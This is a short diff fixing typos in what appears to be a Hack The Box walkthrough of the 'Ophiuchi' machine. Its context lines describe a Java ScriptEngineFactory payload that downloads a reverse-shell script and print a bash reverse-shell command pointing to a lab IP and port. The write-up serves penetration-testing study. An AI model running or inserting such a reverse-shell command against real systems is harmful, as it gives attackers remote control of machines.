@@ -175,7 +175,7 @@ public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
 }
 ```
 
-At first thia payload will download our script of reverse shell *pasha.sh*
+At first this payload will download our script of reverse shell *pasha.sh*
 
 ```
 ┌──(root💀kali)-[~]
@@ -183,7 +183,7 @@ At first thia payload will download our script of reverse shell *pasha.sh*
 /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.147/5555 0>&1'
 ```
 
-Let's compile oyr java payload.
+Let's compile our java payload.
 
 ```
 ┌──(root💀kali)-[~kali/HTB/Ophiuchi/yaml-payload]
